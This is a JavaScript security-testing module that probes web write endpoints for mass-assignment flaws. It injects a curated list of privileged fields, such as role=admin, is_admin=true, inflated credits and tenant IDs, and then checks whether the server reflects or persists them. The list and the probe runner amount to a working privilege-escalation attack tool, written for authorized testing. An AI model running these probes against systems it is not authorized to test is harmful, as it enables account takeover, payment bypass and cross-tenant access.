/**
 * massAssignmentTester.js — Elite-hunter mass assignment / auto-binding probe.
 *
 * Many frameworks auto-bind request data onto models (`{...req.body}` into
 * Prisma/Mongoose, Rails `params`, Laravel `$fillable`, ASP.NET model binding).
 * Extra fields such as `role`, `is_admin`, `is_verified` or `plan` can be
 * silently applied — a classic privilege-escalation primitive (CWE-915).
 *
 * How elite hunters test it:
 *  1. Take a normal write request (e.g. PUT /api/user with {name, email}).
 *  2. Append candidate privileged fields, one per request.
 *  3. Verify the server actually accepted the field — reflection in the
 *     response, or persistence confirmed via a follow-up GET. A bare 200
 *     is never treated as proof.
 *
 * All functions are pure logic; network I/O goes through an injectable
 * `httpClient` so unit tests never touch the network.
 *
 * Safety: probes only ADD benign marker fields to write endpoints. Run only
 * against targets you own or are explicitly authorized to test.
 */

/** HTTP methods mass assignment applies to. */
export const WRITE_METHODS = ['POST', 'PUT', 'PATCH'];

/**
 * Curated privileged field names to inject, grouped by attack goal.
 * Each entry: { field, values, impact, severity }.
 * Values are intentionally benign markers — acceptance is the signal,
 * not the value itself.
 */
export const MASS_ASSIGNMENT_PAYLOADS = [
  // ── Role / privilege escalation ──────────────────────────────
  {
    field: 'role',
    values: ['admin'],
    impact: 'Self-promotion to administrator role',
    severity: 'high',
  },
  {
    field: 'user_role',
    values: ['admin'],
    impact: 'Self-promotion to administrator role',
    severity: 'high',
  },
  {
    field: 'userRole',
    values: ['admin'],
    impact: 'Self-promotion to administrator role',
    severity: 'high',
  },
  {
    field: 'roleid',
    values: [1],
    impact: 'Numeric role promotion (PortSwigger roleid pattern)',
    severity: 'high',
  },
  { field: 'role_id', values: [1], impact: 'Numeric role promotion', severity: 'high' },
  { field: 'isAdmin', values: [true], impact: 'Administrator flag enabled', severity: 'high' },
  { field: 'is_admin', values: [true], impact: 'Administrator flag enabled', severity: 'high' },
  { field: 'admin', values: [true], impact: 'Administrator flag enabled', severity: 'high' },
  {
    field: 'isStaff',
    values: [true],
    impact: 'Staff flag enabled (often unlocks admin panels)',
    severity: 'high',
  },
  {
    field: 'is_staff',
    values: [true],
    impact: 'Staff flag enabled (often unlocks admin panels)',
    severity: 'high',
  },
  { field: 'isSuperuser', values: [true], impact: 'Superuser flag enabled', severity: 'high' },
  { field: 'is_superuser', values: [true], impact: 'Superuser flag enabled', severity: 'high' },
  {
    field: 'privilege',
    values: ['admin'],
    impact: 'Privilege field overwritten',
    severity: 'high',
  },
  {
    field: 'privileges',
    values: ['admin'],
    impact: 'Privilege list overwritten',
    severity: 'high',
  },
  { field: 'accessLevel', values: ['admin'], impact: 'Access level raised', severity: 'high' },
  { field: 'access_level', values: ['admin'], impact: 'Access level raised', severity: 'high' },
  { field: 'permission', values: ['admin'], impact: 'Permission overwritten', severity: 'high' },
  { field: 'permissions', values: ['*'], impact: 'Wildcard permission granted', severity: 'high' },
  {
    field: 'userType',
    values: ['admin'],
    impact: 'Account type changed to admin',
    severity: 'high',
  },
  {
    field: 'user_type',
    values: ['admin'],
    impact: 'Account type changed to admin',
    severity: 'high',
  },
  {
    field: 'accountType',
    values: ['admin'],
    impact: 'Account type changed to admin',
    severity: 'high',
  },
  {
    field: 'account_type',
    values: ['admin'],
    impact: 'Account type changed to admin',
    severity: 'high',
  },
  {
    field: 'group',
    values: ['admin'],
    impact: 'Group membership changed to admin group',
    severity: 'high',
  },

  // ── Verification / status bypass ─────────────────────────────
  {
    field: 'isVerified',
    values: [true],
    impact: 'Identity verification bypassed',
    severity: 'medium',
  },
  {
    field: 'is_verified',
    values: [true],
    impact: 'Identity verification bypassed',
    severity: 'medium',
  },
  {
    field: 'verified',
    values: [true],
    impact: 'Identity verification bypassed',
    severity: 'medium',
  },
  {
    field: 'emailVerified',
    values: [true],
    impact: 'Email verification bypassed',
    severity: 'medium',
  },
  {
    field: 'email_verified',
    values: [true],
    impact: 'Email verification bypassed',
    severity: 'medium',
  },
  { field: 'approved', values: [true], impact: 'Approval workflow bypassed', severity: 'medium' },
  { field: 'isApproved', values: [true], impact: 'Approval workflow bypassed', severity: 'medium' },

  // ── Plan / billing manipulation ──────────────────────────────
  {
    field: 'plan',
    values: ['premium'],
    impact: 'Subscription plan upgraded without payment',
    severity: 'medium',
  },
  {
    field: 'subscription',
    values: ['premium'],
    impact: 'Subscription upgraded without payment',
    severity: 'medium',
  },
  {
    field: 'tier',
    values: ['enterprise'],
    impact: 'Tier upgraded without payment',
    severity: 'medium',
  },
  {
    field: 'isPremium',
    values: [true],
    impact: 'Premium features unlocked without payment',
    severity: 'medium',
  },
  {
    field: 'is_premium',
    values: [true],
    impact: 'Premium features unlocked without payment',
    severity: 'medium',
  },
  {
    field: 'credits',
    values: [999999],
    impact: 'Account credit balance inflated',
    severity: 'medium',
  },
  { field: 'balance', values: [999999], impact: 'Account balance inflated', severity: 'medium' },

  // ── Tenant / organization crossing ───────────────────────────
  {
    field: 'tenantId',
    values: ['probe-tenant'],
    impact: 'Tenant association overwritten (cross-tenant risk)',
    severity: 'medium',
  },
  {
    field: 'tenant_id',
    values: ['probe-tenant'],
    impact: 'Tenant association overwritten (cross-tenant risk)',
    severity: 'medium',
  },
  {
    field: 'orgId',
    values: ['probe-org'],
    impact: 'Organization association overwritten',
    severity: 'medium',
  },
  {
    field: 'organizationId',
    values: ['probe-org'],
    impact: 'Organization association overwritten',
    severity: 'medium',
  },
  {
    field: 'teamId',
    values: ['probe-team'],
    impact: 'Team association overwritten',
    severity: 'medium',
  },
];

/** Response wrappers elite APIs commonly nest user objects under. */
const RESPONSE_WRAPPERS = ['data', 'user', 'result', 'profile', 'account', 'attributes'];

/**
 * Normalize a request body to a plain object.
 * Accepts objects and JSON strings; returns null for anything else
 * (form data, binary, unparseable strings are out of scope for this probe).
 */
function normalizeBody(body) {
  if (body == null) return {};
  if (typeof body === 'object' && !Array.isArray(body)) return body;
  if (typeof body === 'string') {
    try {
      const parsed = JSON.parse(body);
      if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) return parsed;
    } catch {
      /* not JSON — unsupported */
    }
  }
  return null;
}

/**
 * Parse a response body to an object when possible.
 */
function parseResponseBody(body) {
  if (body == null) return null;
  if (typeof body === 'object') return body;
  if (typeof body === 'string') {
    try {
      const parsed = JSON.parse(body);
      if (parsed && typeof parsed === 'object') return parsed;
    } catch {
      /* fall through */
    }
  }
  return null;
}

/**
 * Loose value comparison: true ≈ "true" ≈ 1, case-insensitive strings.
 */
function valuesEqual(a, b) {
  const norm = v => {
    if (v === true) return 'true';
    if (v === false) return 'false';
    if (v == null) return '';
    return String(v).toLowerCase().trim();
  };
  return norm(a) === norm(b);
}

/**
 * Deep-search an object for a field name (bounded depth, cycle-safe).
 * Checks top level first, then common API wrappers, then a bounded
 * recursive scan. Returns { found, value }.
 */
function findFieldDeep(obj, field, depth = 0, seen = new Set()) {
  if (!obj || typeof obj !== 'object' || depth > 3 || seen.has(obj)) {
    return { found: false, value: undefined };
  }
  seen.add(obj);
  if (Object.prototype.hasOwnProperty.call(obj, field)) {
    return { found: true, value: obj[field] };
  }
  for (const wrap of RESPONSE_WRAPPERS) {
    if (obj[wrap] && typeof obj[wrap] === 'object') {
      const hit = findFieldDeep(obj[wrap], field, depth + 1, seen);
      if (hit.found) return hit;
    }
  }
  if (depth < 2) {
    for (const key of Object.keys(obj)) {
      const v = obj[key];
      if (v && typeof v === 'object') {
        const hit = findFieldDeep(v, field, depth + 1, seen);
        if (hit.found) return hit;
      }
    }
  }
  return { found: false, value: undefined };
}

/**
 * Check whether an injected field was accepted by the server, based on the
 * response body. Returns { matched, keyPresent }:
 *  - matched:    field present AND value equals the injected value (strong).
 *  - keyPresent: field present but with a different/coerced value (medium).
 */
export function checkFieldAccepted(responseBody, field, value) {
  const parsed = parseResponseBody(responseBody);
  if (parsed) {
    const hit = findFieldDeep(parsed, field);
    if (hit.found) {
      return { matched: valuesEqual(hit.value, value), keyPresent: true };
    }
  }
  // Fallback: raw-text search for non-JSON echoes ("field": value).
  const text = String(responseBody || '');
  const keyRe = new RegExp(`["']${field}["']\\s*[:=]`, 'i');
  if (keyRe.test(text)) {
    const valRe = new RegExp(
      `["']${field}["']\\s*[:=]\\s*["']?${String(value).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`,
      'i'
    );
    return { matched: valRe.test(text), keyPresent: true };
  }
  return { matched: false, keyPresent: false };
}

/**
 * Build one probe request per privileged field/value, each adding a single
 * field to a copy of the base request body. Fields already present in the
 * base body are skipped (they are not "added" fields).
 *
 * Returns [] for non-write methods or unsupported body types.
 */
export function buildMassAssignmentProbes(baseRequest = {}, options = {}) {
  const { method = 'POST', url = '', body = {}, headers = {} } = baseRequest;
  const { payloads = MASS_ASSIGNMENT_PAYLOADS, methods = WRITE_METHODS } = options;

  const m = String(method).toUpperCase();
  if (!methods.includes(m)) return [];

  const baseBody = normalizeBody(body);
  if (baseBody === null) return [];

  const probes = [];
  for (const p of payloads) {
    if (Object.prototype.hasOwnProperty.call(baseBody, p.field)) continue;
    for (const value of p.values) {
      probes.push({
        field: p.field,
        value,
        impact: p.impact,
        severity: p.severity,
        request: {
          method: m,
          url,
          headers: { ...headers },
          body: { ...baseBody, [p.field]: value },
        },
      });
    }
  }
  return probes;
}

/**
 * Analyze probe responses against the baseline.
 *
 * A finding is raised only when the server demonstrably accepted the field:
 *  - high confidence:   injected value reflected in the response body.
 *  - medium confidence:  field key present with a normalized/coerced value,
 *                        or confirmed persisted via a verification GET.
 * A bare 2xx with no reflection is NOT a finding (elite rule: verify, don't
 * assume).
 */
export function analyzeMassAssignment(baseResponse = {}, probeResponses = []) {
  const findings = [];
  const seen = new Set();

  for (const pr of probeResponses || []) {
    if (!pr || pr.error || !pr.response || seen.has(pr.field)) continue;
    const { field, value, response, persisted } = pr;
    const check = checkFieldAccepted(response.body, field, value);

    if (check.matched || persisted) {
      seen.add(field);
      findings.push({
        type: 'Mass Assignment',
        cwe: 'CWE-915',
        field,
        value,
        confidence: 'high',
        severity: pr.severity || 'high',
        evidence: persisted
          ? `Privileged field "${field}" persisted: verification GET returned the injected value.`
          : `Server accepted and reflected privileged field "${field}" with value ${JSON.stringify(value)} in the response body.`,
        impact: pr.impact || 'Privileged field accepted by the server',
        method: pr.request?.method,
        url: pr.request?.url,
      });
    } else if (check.keyPresent) {
      seen.add(field);
      findings.push({
        type: 'Mass Assignment',
        cwe: 'CWE-915',
        field,
        value,
        confidence: 'medium',
        severity: pr.severity || 'medium',
        evidence: `Privileged field "${field}" was accepted (present in response with a normalized value); manual verification recommended.`,
        impact: pr.impact || 'Privileged field accepted by the server',
        method: pr.request?.method,
        url: pr.request?.url,
      });
    }
  }
  return findings;
}

/**
 * Run the full mass-assignment test against a write endpoint.
 *
 * @param {object} target
 *   { method, url, body, headers, verify? }
 *   `verify` (optional) is { method, url, headers } — a read endpoint
 *   (e.g. GET /api/user) used to confirm persistence after each probe,
 *   the elite verification step.
 * @param {function} httpClient  async (request) => ({ status, body, headers? })
 * @param {object}   options     passed through to buildMassAssignmentProbes
 * @returns {object} { method, url, skipped, probes, findings, baseStatus }
 */
export async function testMassAssignment(target = {}, httpClient, options = {}) {
  if (typeof httpClient !== 'function') {
    throw new TypeError('testMassAssignment requires an httpClient function');
  }
  const method = String(target.method || 'POST').toUpperCase();
  const url = target.url || '';

  if (!WRITE_METHODS.includes(method)) {
    return {
      method,
      url,
      skipped: true,
      reason: `Mass assignment applies to write endpoints; got ${method}.`,
      probes: 0,
      findings: [],
    };
  }

  const probes = buildMassAssignmentProbes(target, options);

  // Baseline: the unmodified request, for status comparison context.
  let baseResponse = null;
  try {
    baseResponse = await httpClient({
      method,
      url,
      headers: { ...(target.headers || {}) },
      body: target.body,
    });
  } catch (err) {
    baseResponse = { error: err?.message || String(err) };
  }

  // Probes run sequentially — polite by design, and ordering keeps
  // per-field results deterministic.
  const probeResponses = [];
  for (const probe of probes) {
    try {
      const response = await httpClient(probe.request);
      let persisted = false;
      if (target.verify && target.verify.url) {
        try {
          const vres = await httpClient({
            method: (target.verify.method || 'GET').toUpperCase(),
            url: target.verify.url,
            headers: { ...(target.verify.headers || target.headers || {}) },
          });
          persisted = checkFieldAccepted(vres.body, probe.field, probe.value).matched;
        } catch {
          /* verification is best-effort; reflection still counts */
        }
      }
      probeResponses.push({ ...probe, response, persisted });
    } catch (err) {
      // One failed probe must not abort the run.
      probeResponses.push({ ...probe, error: err?.message || String(err) });
    }
  }

  const findings = analyzeMassAssignment(baseResponse, probeResponses, options);
  return {
    method,
    url,
    skipped: false,
    probes: probes.length,
    findings,
    baseStatus: baseResponse?.status,
  };
}
